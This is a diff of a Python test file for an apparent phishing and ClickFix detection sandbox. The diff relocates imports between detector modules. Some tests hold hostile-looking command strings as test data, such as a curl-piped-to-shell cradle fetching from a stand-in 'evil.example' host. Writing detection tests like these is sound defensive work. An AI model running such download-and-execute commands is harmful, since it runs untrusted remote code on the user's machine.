@@ -12,7 +12,9 @@ from sandbox.analysis.domains import (
     owned_by,
 )
 from sandbox.analysis.engine import behaviour_hits
-from sandbox.analysis.facts import CaptureData, build_facts, obfuscation
+from sandbox.detections.base import CaptureData
+from sandbox.detections.observe import build_facts
+from sandbox.detections.scripts import obfuscation
 from sandbox.analysis.local import builtin_behaviour
 from sandbox.analysis.scoring import score
 from sandbox.rules import defaults
@@ -382,7 +384,7 @@ def test_cradle_from_non_installer_source_is_still_clickfix(text):
 
 
 def _installer_urls():
-    from sandbox.analysis.facts import INSTALLER_SOURCES
+    from sandbox.detections.clickfix import INSTALLER_SOURCES
 
     for host, prefixes in sorted(INSTALLER_SOURCES.items()):
         path = prefixes[0] if prefixes else "/"
@@ -392,13 +394,13 @@ def _installer_urls():
 @pytest.mark.parametrize("url", list(_installer_urls()))
 def test_every_installer_source_is_recognised(url):
     """L2 §1.1: INSTALLER_SOURCES is curated data; each entry gets a test."""
-    from sandbox.analysis.facts import _clickfix_traits
+    from sandbox.detections.clickfix import _clickfix_traits
 
     assert _clickfix_traits(f"curl -fsSL {url} | sh") == "installer"
 
 
 def test_unlisted_host_cradle_stays_cradle():
-    from sandbox.analysis.facts import _clickfix_traits
+    from sandbox.detections.clickfix import _clickfix_traits
 
     assert _clickfix_traits("curl -fsSL https://astral.sh.evil.example/x | sh") == "cradle"
 
@@ -447,14 +449,14 @@ def test_remote_msi_and_disguised_commands_are_clickfix(text):
 
 
 def test_local_msi_install_is_not_clickfix():
-    from sandbox.analysis.facts import _clickfix_traits
+    from sandbox.detections.clickfix import _clickfix_traits
 
     assert _clickfix_traits(f"{_MSI} /i C:\\Downloads\\setup.msi /qn") is None
     assert _clickfix_traits(f"{_MSI} /x {{1234-5678}} /quiet") is None
 
 
 def test_installer_repo_prefix_is_case_insensitive():
-    from sandbox.analysis.facts import _clickfix_traits
+    from sandbox.detections.clickfix import _clickfix_traits
 
     lower = "curl -fsSL https://raw.githubusercontent.com/homebrew/install/HEAD/install.sh | sh"
     assert _clickfix_traits(lower) == "installer"
@@ -472,7 +474,7 @@ def test_dns_cradle_clipboard_is_clickfix(text):
     data = _data("https://verify.example/", clipboard=_clip(text))
     assert build_facts(data)["clipboard"]["clickfix_unambiguous"] == 1
     assert "clickfix_clipboard_command" in _hits(data)
-    from sandbox.analysis.facts import extract_iocs
+    from sandbox.detections.observe import extract_iocs
 
     iocs = extract_iocs(data, build_facts(data))
     assert "stage.example" in iocs["domains"]
@@ -807,7 +809,7 @@ def test_dhl_and_stc_keywords_stay_whole_word():
     """Recorded disagreement with §3.3: plain keywords are already whole-word, so 'dhl'
     never matches inside 'dhlpipeline', and moving DHL/STC to case-sensitive acronyms
     would miss lower-case mentions ('track your dhl parcel')."""
-    from sandbox.analysis.facts import _keyword
+    from sandbox.detections.hosting import _keyword
 
     assert not _keyword("dhl").search("dhlpipeline build")
     assert _keyword("dhl").search("track your dhl parcel")
@@ -989,7 +991,7 @@ def test_seed_phrase_harvest_and_real_wallet():
 
 
 def test_arabic_keywords_match_whole_words_only():
-    from sandbox.analysis.facts import _keyword
+    from sandbox.detections.hosting import _keyword
 
     assert _keyword("نسك").search("منصة نسك للحج")
     assert not _keyword("نسك").search("أداء المناسك")
@@ -2132,7 +2134,7 @@ def _gtm_exec(*samples):
 
 def test_runtime_dynamic_execution_ignores_tag_manager_variables():
     """Live round 2: wordpress.org scored 35 on GTM's own eval of tag code."""
-    from sandbox.analysis.facts import _entropy
+    from sandbox.detections.base import _entropy
 
     assert len(_GTM_VARIABLE) > 1024 and _entropy(_GTM_VARIABLE) > 4.5  # would have hit
     url = "https://wordpress.example/news/"
